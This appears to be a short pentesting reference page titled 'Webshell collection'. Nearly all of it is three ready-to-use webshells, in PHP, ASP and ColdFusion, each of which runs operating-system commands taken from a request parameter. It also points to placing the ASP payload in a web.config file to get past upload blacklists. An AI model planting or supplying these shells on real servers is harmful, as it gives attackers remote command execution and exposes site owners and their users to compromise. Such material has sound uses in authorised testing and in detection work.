---
title: "Webshell collection"
description: "A collection of simple webshells"
date: 11/03/2021
categories:
 - Web
tags:
 - webshell
 - rce
---


## PHP

On the PHP page there is other [functions to execute code](/php/#command-execution):

```php
<?php
	if(isset($_GET['cmd'])) {
		system($_GET['cmd']);
	}
?>
```


## ASP

```asp
<%
Response.write("<pre>")
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c " & Request.QueryString("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
Response.write("</pre>")
%>
```

This payload can be include on a [`web.config` file](/iis/#bypass-blacklist-upload)


## ColdFusion

```cfm
<cfsavecontent variable="cmdOutput">
<cfexecute name="C:\Windows\System32\cmd.exe" arguments="/c #Request.cmd#" timeout="10"></cfexecute>
</cfsavecontent>
<pre>
#HTMLCodeFormat(cmdOutput)#
</pre>
```
